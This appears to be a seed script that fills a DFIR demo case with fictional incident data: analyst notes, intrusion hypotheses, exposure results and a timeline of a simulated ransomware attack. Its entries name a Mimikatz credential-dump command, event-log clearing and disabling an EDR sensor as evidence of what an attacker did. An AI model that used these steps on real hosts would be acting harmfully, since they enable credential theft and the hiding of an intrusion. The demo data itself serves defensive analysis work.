  await write(join(caseDir, "state", "notebook.json"), [
    {
      ...
      type: "note",
      text: "DC01 has a ~16h logging blackout on May 16 (10:13 → 02:15) right after the Mimikatz dump — wevtutil cl + Falcon sensor stop. Need to pull USN journal, SRUM, Prefetch and Amcache from DC01 to reconstruct what ran during the gap.",
      author: "Demo Analyst",
  ...
  await write(join(caseDir, "state", "hypotheses.json"), [
    {
      id: "hyp001",
      title: "Initial access was a parallel web-exploit + phishing op by one ALPHV/BlackCat affiliate",
      description:
        "Web exploitation of WEB01 (CVE-2021-41773 + Log4Shell) and the phishing email both landed on May 15 within the hour — likely the same operator using two access vectors in parallel to guarantee a foothold.",
      expectedOutcome:
        "shared source infrastructure/tooling across both vectors, or overlapping timing on WEB01 and the mail gateway",
      status: "supported",
      relatedTechniques: ["T1190", "T1566.001"],
      relatedEventIds: [],
      relatedIocIds: [],
      assignee: "",
      notes: "Both vectors corroborated by the May 15 timeline.",
      source: "analyst",
      analystTouched: true,
      author: "Demo Analyst",
    ...
    {
      id: "hyp002",
      title: "The attacker staged data during the DC01 logging blackout",
      description:
        "DC01 went dark for ~16h on May 16 right after the Mimikatz dump (wevtutil cl + Falcon stop) — classic anti-forensics around a staging window.",
      expectedOutcome:
        "SRUM per-app network bytes, or USN-journal archive (.7z/.zip) writes on DC01 inside the 10:13 → 02:15 window",
      status: "open",
      relatedTechniques: ["T1070.001", "T1562.001", "T1074"],
      relatedEventIds: [],
      relatedIocIds: [],
      assignee: "",
      notes: "",
    ...
    revisions: [
      {
        ...
        date: "2026-05-22",
        author: "Demo Analyst",
        comments: "Initial draft — preliminary findings",
      },
      {
        version: "0.2",
        date: "2026-05-23",
        author: "Demo Analyst",
        comments: "Added credential dump scope, exfiltration details",
      },
      {
        version: "1.0",
        date: "2026-05-25",
        author: "Senior DFIR Analyst",
        comments: "Final — reviewed and approved for release",
      },
    ],
    distribution: [
    ...
    glossary: [
      {
        term: "Cobalt Strike",
        explanation:
          "A commercial penetration testing framework widely abused by threat actors for post-exploitation.",
      },
      {
        term: "C2",
        explanation:
          "Command and Control — the infrastructure used by the attacker to send commands to compromised systems.",
      },
      {
        term: "LSASS",
        explanation:
          "Local Security Authority Subsystem Service — the Windows process that stores credential material in memory.",
      },
      {
        term: "PsExec",
        explanation:
          "A Sysinternals tool for executing processes on remote systems. Frequently abused for lateral movement.",
      },
      {
        term: "MITRE ATT&CK",
        explanation:
          "A publicly available knowledge base of adversary tactics, techniques, and procedures (TTPs).",
      },
      {
        term: "BlackCat/ALPHV",
        explanation: "A ransomware-as-a-service group active since 2021. Known for triple-extortion.",
      },
    ],
    conclusions:
  ...
  await write(join(caseDir, "state", "customer-exposure.json"), {
    ...
    results: [
      ...
      },
      {
        ...
        exposedData: ["Email addresses", "Password hints", "Passwords", "Usernames"],
        secretPresent: true,
      },
      {
        provider: "Have I Been Pwned",
        targetType: "email",
        target: "security@globaltech.com",
        email: "security@globaltech.com",
        breach: "Dropbox",
      ...
      },
      {
        provider: "Shodan",
        targetType: "domain",
        target: "globaltech.com",
        breach: "203.0.113.10:8080 Apache httpd 2.4.49",
        breachDate: "2026-05-20T04:12:00Z",
      ...
      },
      {
        ...
        targetType: "domain",
        target: "globaltech.com",
        breach: "203.0.113.10:8443 Apache Tomcat 9.0.53",
        breachDate: "2026-05-20T04:12:00Z",
      ...
      },
      {
        ...
        targetType: "domain",
        target: "globaltech.com",
        breach: "203.0.113.25:3389 Microsoft Terminal Services",
        breachDate: "2026-05-19T22:40:00Z",
        exposedData: ["3389/tcp", "Microsoft Terminal Services", "GlobalTech Industries"],
        sourceUrl: "https://www.shodan.io/host/203.0.113.25",
        secretPresent: false,
      },
      {
        provider: "Shodan",
        targetType: "domain",
        target: "globaltech.com",
        breach: "203.0.113.42:25 Postfix smtpd",
        breachDate: "2026-05-19T18:05:00Z",
        exposedData: ["25/tcp", "Postfix smtpd", "GlobalTech Industries"],
        sourceUrl: "https://www.shodan.io/host/203.0.113.42",
        secretPresent: false,
      },
    ],
    errors: [],
  ...
  await write(join(caseDir, "state", "import-meta.json"), {
    ...
    lastDiff: {
      added: [
        ...
        {
          timestamp: ts(16, 8, 43),
          description: "Mimikatz uploaded to DC01 C:\\Windows\\Temp\\m64.exe",
          severity: "Critical",
        },
        {
          timestamp: ts(16, 8, 45),
          description: "Mimikatz sekurlsa::logonpasswords executed on DC01",
          severity: "Critical",
        },
        {
          timestamp: ts(19, 22, 17),
          description: "CrowdStrike quarantined encrypt.exe on DC01 and WEB01",
          severity: "High",
        },
      ],
      removed: [
        {
          timestamp: ts(15, 10, 0),
          description: "Routine Windows Defender definition update",
          severity: "Info",
        },
        {
          timestamp: ts(16, 7, 30),
          description: "Scheduled backup task completed normally",
          severity: "Info",
        },
      ],
    },
  ...
  const capturesLines = [
    {
      ...
      isDuplicate: false,
      screenshotFile: "000001_2026-05-22T09:00:00.000Z_New-Tab.webp",
    },
    {
      caseId,
      sequenceNumber: 2,
      timestamp: "2026-05-22T09:05:00.000Z",
      url: "http://localhost:4773/dashboard",
      tabTitle: "DFIR Companion",
      triggerType: "navigation",
      contentHash: "fea4b2c81e3d5f70",
      isDuplicate: false,
      screenshotFile: "000002_2026-05-22T09:05:00.000Z_DFIR-Companion.webp",
    },
    {
      caseId,
      sequenceNumber: 3,
      timestamp: "2026-05-22T09:30:00.000Z",
      url: "https://www.virustotal.com/gui/ip-address/185.220.101.47",
      tabTitle: "VirusTotal — 185.220.101.47",
      triggerType: "navigation",
      contentHash: "a1b2c3d4e5f60718",
      isDuplicate: false,
      screenshotFile: "000003_2026-05-22T09:30:00.000Z_VirusTotal.webp",
    },
    {
      caseId,
      sequenceNumber: 4,
      ...
      tabTitle: "DFIR Companion",
      triggerType: "timer",
      contentHash: "fea4b2c81e3d5f72",
      isDuplicate: false,
      screenshotFile: "000004_2026-05-22T10:00:00.000Z_DFIR-Companion.webp",
    },
    {
      caseId,
      sequenceNumber: 5,
      ...
      contentHash: "fea4b2c81e3d5f74",
      isDuplicate: false,
      screenshotFile: "000005_2026-05-22T10:30:00.000Z_DFIR-Companion.webp",
    },
  ];
  await writeFile(
  ...
  const importLines = [
    {
      ...
      filename: "thor-wkstn-jsmith.json",
      originalName: "thor_scan_WKSTN-JSMITH.json",
      rows: 87,
      bytes: 134500,
    },
    {
      caseId,
      sequenceNumber: 2,
      importedAt: "2026-05-22T10:05:00.000Z",
      filename: "suricata-eve-may15-22.json",
      originalName: "suricata_eve.json",
      rows: 312,
      bytes: 891200,
    },
    {
      caseId,
      sequenceNumber: 3,
      importedAt: "2026-05-22T10:10:00.000Z",
      filename: "crowdstrike-siem-export.json",
      originalName: "cs_siem_export_may22.json",
      rows: 204,
      bytes: 520000,
    },
    {
      caseId,
      sequenceNumber: 4,
      importedAt: "2026-05-22T10:30:00.000Z",
      filename: "dc01-evtx-chainsaw.json",
      originalName: "DC01_chainsaw_hunt.json",
      rows: 143,
      bytes: 287000,
    },
  ];
